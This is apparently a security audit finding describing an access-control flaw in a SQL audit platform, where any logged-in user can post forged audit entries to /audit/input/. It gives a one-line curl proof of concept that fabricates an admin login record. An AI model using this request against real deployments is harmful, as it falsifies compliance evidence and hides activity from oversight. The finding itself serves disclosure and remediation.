# Audit record forgery by any logged-in user

**Verification: CODE-VERIFIED**

## Description
POST `/audit/input/` writes AuditEntry records via `AuditEntry.objects.create()` with no distinction from machine-generated events (login/logout/failure callbacks). The endpoint requires only `LoginRequiredMixin`, no permission check.

## Impact
On a SQL audit platform, any authenticated user forges compliance evidence indistinguishable from system audit records. Undermines the platform's primary security purpose.

## PoC
```bash
curl -X POST "http://<host>/audit/input/" \
  -H "Cookie: sessionid=<any_logged_in_session>" \
  -d "user=admin&action=login&ip=10.0.0.1"
```

## Execution result
```
Code path analysis: POST /audit/input/ requires only login; creates
AuditEntry identical to system-generated ones.
```
